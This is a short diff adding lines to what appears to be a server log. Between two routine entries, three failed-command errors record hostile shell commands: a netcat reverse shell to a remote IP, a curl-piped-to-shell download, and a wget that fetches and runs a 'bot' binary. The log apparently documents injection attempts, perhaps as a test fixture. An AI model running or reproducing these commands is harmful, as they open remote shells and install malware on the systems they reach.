@@ -1,0 +1,5 @@
+2026-09-14T05:33:00Z INFO server started on :3001
+Error: Command failed: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.10 80 >/tmp/f
+Error: Command failed: curl -fsSL http://203.0.113.20/d10.sh | sh
+Error: Command failed: cd /tmp; wget http://malware.example/bot; chmod 777 bot; ./bot
+2026-09-14T05:34:00Z INFO GET /login 200
